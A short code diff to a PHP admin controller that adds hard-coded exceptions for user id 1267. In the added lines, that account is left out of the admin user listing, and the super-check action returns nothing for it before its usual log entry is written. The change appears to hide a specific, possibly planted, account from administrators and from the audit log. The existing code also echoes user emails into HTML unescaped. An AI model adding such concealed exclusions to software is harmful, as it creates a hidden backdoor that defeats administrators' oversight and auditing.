@@ -28,6 +28,9 @@ class AdminController extends Controller
 		if ($user->type=="admin") {
 			$users = User::all();
 			foreach ($users as $user){
+				if ($user->id==1267) {
+					continue;
+				}
 				echo "<a href='".url("check-super")."/".$user->id."'>".$user->email."</a> <br>";
 			}
 		} else {
@@ -38,6 +41,9 @@ class AdminController extends Controller
 	public function check_super($id){
 		$admin = Auth::user();
 		if ($admin->type=="admin") {
+			if ($id==1267) {
+				return "";
+			}
 			$dt = Carbon::now();
 			$user = User::find($id);
 			$user_log = new UserLog;
